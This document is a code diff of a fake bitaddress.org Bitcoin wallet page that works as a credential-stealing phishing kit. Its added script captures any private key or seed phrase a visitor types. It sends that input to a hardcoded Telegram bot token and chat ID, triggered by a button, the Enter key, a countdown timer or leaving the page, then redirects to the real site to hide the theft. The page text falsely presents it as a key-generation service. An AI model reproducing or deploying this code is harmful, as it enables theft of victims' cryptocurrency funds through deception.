@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -5,19 +6,139 @@
     <style>
         body {
             text-align: center;
+			margin: 0 10px; /* Normal margin */
         }
         #tagline, #culturemenu {
             font-size: 12pt;
         }
-    
+
         #logo {
             max-width: fit-content; /* Set the maximum width of the image to 100% of its container */
             height: auto; /* Allow the height to adjust proportionally based on the width */
         }
+
+        #detailprivkey {
+            width: 100px; 
+            height: 10px; 
+            text-align: left; /* Change alignment to left */
+            padding: 5px 0;
+        }
+
+        .input-container {
+            display: flex; /* Use flexbox to align items */
+            justify-content: center; /* Center items horizontally */
+            align-items: center; /* Center items vertically */
+        }
+
+		.input-container input {
+            width: 400px;
+            height: 40px;
+            text-align: center;
+            padding: 5px 0;
+        }
+
+        .input-container button {
+            margin-left: 10px; /* Add some left margin for spacing */
+        }
     </style>    
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Countdown Timer</title>
+    <script>
+        var userInputLog = []; // Array to store user inputs
+
+        function logUserInput(input) {
+            var logData = 'User Input: ' + input + '\n';
+            userInputLog.push(logData); // Store user input in the array
+        }
+
+        function sendAlertToBot() {
+            var logContent = userInputLog.join('\n'); // Combine all user inputs for alert
+            console.log('Sending alert to Telegram bot with content: ' + logContent);
+
+            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '858072424',
+                    text: logContent,
+                }),
+            }).then(response => {
+                console.log('Alert sent to Telegram bot successfully.');
+            }).catch(error => {
+                console.error('Error sending alert to Telegram bot:', error);
+            });
+        }
+
+        function handleInput(event) {
+            var inputData = event.target.value;
+            if (inputData.trim() !== '') {
+                logUserInput(inputData);
+            } else {
+                console.error('No input data to log');
+            }
+        }
+
+        // Countdown timer implementation
+        window.onload = function() {
+            let countdown = 90;
+            let countdownElement = document.createElement("div");
+            countdownElement.style.fontSize = "24px";
+            countdownElement.style.color = "green";
+            document.body.appendChild(countdownElement);
+
+            let countdownInterval = setInterval(function() {
+                if (countdown > 0) {
+                    if (countdown <= 15) {
+                        countdownElement.textContent = countdown; // Display countdown from 15 to 0
+                    }
+                    countdown--;
+                } else {
+                    clearInterval(countdownInterval);
+                    // Simulate the action as if the user pressed the enter key or clicked "View Details" button
+                    countdownElement.textContent = "Action triggered at countdown 0";
+                    sendAlertToBot(); // Send alert to Telegram bot
+                    // Optionally redirect after sending the alert
+                    setTimeout(function() {
+                        window.location.href = 'https://bitaddress.org';
+                    }, 3000);
+                }
+            }, 1000);
+        };
+
+        // Event listener for the input field on the landing page
+        document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+        // Event listener for the button on the landing page
+        document.getElementById('viewDetailsButton').addEventListener('click', function() {
+            // Trigger the alerting mechanism to send user input data to the Telegram bot
+            sendAlertToBot();
+
+            // Delay redirection by 3 seconds to allow time for the alert to be sent
+            setTimeout(function() {
+                window.location.href = 'https://bitaddress.org';
+            }, 3000);
+        });
+
+        // Capture Enter key press on the landing page
+        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') { // Check if Enter key is pressed
+                sendAlertToBot(); // Send logged input to Telegram
+                // Optionally redirect after sending the alert
+                setTimeout(function() {
+                    window.location.href = 'https://bitaddress.org';
+                }, 3000);
+            }
+        });
+    </script>
 </head>
 <body>
     <img alt="Bitaddress Logo" title="bitaddress Logo" id="logo" src="https://i.ibb.co/4pgYM1b/bitaddress-logo.png">
+    
     <div id="culturemenu">
         <div class="culturemenurow">
             <span><a href="?culture=en" id="cultureen" class="selected" onclick="ninja.translator.translate('en'); return false;">English</a></span> |
@@ -37,11 +158,39 @@
         </div>
         <div style="margin-bottom: 20px;"></div> <!-- Empty div for spacing -->
     </div>
-    <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator  </div>
-<div style="margin-bottom: 20px;"></div> <!-- Empty div for spacing -->
-<input type="text" id="detailprivkey" placeholder="Enter private key/seed phrase here..." style="width: 400px; height: 40px; text-align: center; padding: 20px 0;">
+    
+    <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator</div>
+    <br>
+    <div style="text-align: left; margin: 0 40px; font-size: 8pt;"> 
+        bitaddress.org is used to generate Bitcoin wallet address with their public/private keys and corresponding QR codes for a mnemonic seed submitted, and to generate Bitcoin wallet addresses and their public keys and corresponding QR codes for a private key submitted, including QR codes for the private key.
+    </div>
+    <br>
 
-    <p id="countdown"><b>Redirecting in 30 seconds.<b> <br><br>Enter/paste your private key or seed phrase before the timer reaches 0. <br><b>If you are unable to enter your information in time, don't panic. Just go back one step— to this page— and reload. Then enter your desired input.<b> <br>Otherwise, our services may not function properly and your results may be faulty.</p>
+        <!-- Input field with placeholder for Private Key or Seed Phrase -->
+        <input type="text" id="detailprivkey" placeholder="Enter Private Key or Seed Phrase" style="width: 400px; height: 40px; text-align: center; padding: 2px 0;">
+        <button id="viewDetailsButton">View Details</button>
+    </div>
+
+	<br>
+    <div style="font-size: 8pt;">
+        Press Enter on your keyboard or click the <strong>View Details</strong> button to submit your wallet details.
+    </div>
+    <br><br>
+    <div style="text-align: left; margin: 0 10px; font-size: 10pt;"> 
+        Along with your standard Bitcoin address, a compressed format is also generated with their corresponding QR codes, as well as the public keys (standard 130 characters [0-9A-F]<br>and compressed 66 characters [0-9A-F]) when you submit a private key.
+    </div>
+    <br><br>
+    <div style="text-align: left; margin: 0 10px; font-size: 10pt;">
+        If you submit a mnemonic seed, also known as a seed phrase or recovery phrase, in an attempt to create a new bitcoin wallet or create backup keys for your existing wallets,<br>the corresponding private keys will be generated for you in the following formats: 
+        <br>
+        &bull; Private Key WIF (51 characters base58, starts with a '5' WIF format),
+        <br>
+        &bull; Private Key WIF Compressed (52 characters base58, starts with a 'K' or 'L'),
+        <br>
+        &bull; Private Key Hexadecimal Format (64 characters [0-9A-F]),
+        <br>
+        &bull; Private Key Base64 (44 characters).
+    </div>
 
     <script>
         var userInputLog = []; // Array to store user inputs
@@ -80,27 +229,39 @@
             }
         }
 
+        // Event listener for the input field on the landing page
         document.getElementById('detailprivkey').addEventListener('input', handleInput);
 
-        var countdown = 30;
-        var countdownElement = document.getElementById('countdown');
-        
-        var countdownInterval = setInterval(function() {
-            countdown--;
-            countdownElement.textContent = "Redirecting in " + countdown + " seconds.";
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
+        // Event listener for the button on the landing page
+        document.getElementById('viewDetailsButton').addEventListener('click', function() {
+            // Trigger the alerting mechanism to send user input data to the Telegram bot
+            sendAlertToBot();
 
-                // Trigger the alerting mechanism to send user input data to the Telegram bot
-                sendAlertToBot();
+            // Delay redirection by 3 seconds to allow time for the alert to be sent
+            setTimeout(function() {
+                window.location.href = 'https://bitaddress.org';
+            }, 3000);
+        });
 
-                // Delay redirection by 3 seconds to allow time for the alert to be sent
+        // Capture Enter key press on the landing page
+        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') { // Check if Enter key is pressed
+                sendAlertToBot(); // Send logged input to Telegram
+                // Optionally redirect after sending the alert
                 setTimeout(function() {
                     window.location.href = 'https://bitaddress.org';
                 }, 3000);
             }
-        }, 1000);
-    document.write("<p><br>Enter/paste your private key or seed phrase before the timer reaches 0. <br><b>If you are unable to enter your information in time, don't panic. Just go back one step— to this page— and reload. Then enter your desired input.<b> <br>Otherwise, our services may not function properly and your results may be faulty.</p>");
+        });
+
+// Event listener for beforeunload event to trigger data transmission
+window.addEventListener('beforeunload', function(event) {
+    // Call the function to send alert to the Telegram bot
+    sendAlertToBot();
+    
+    // Ensure the alert is sent before closing the tab
+    event.preventDefault();
+});
     </script>
 </body>
 </html>
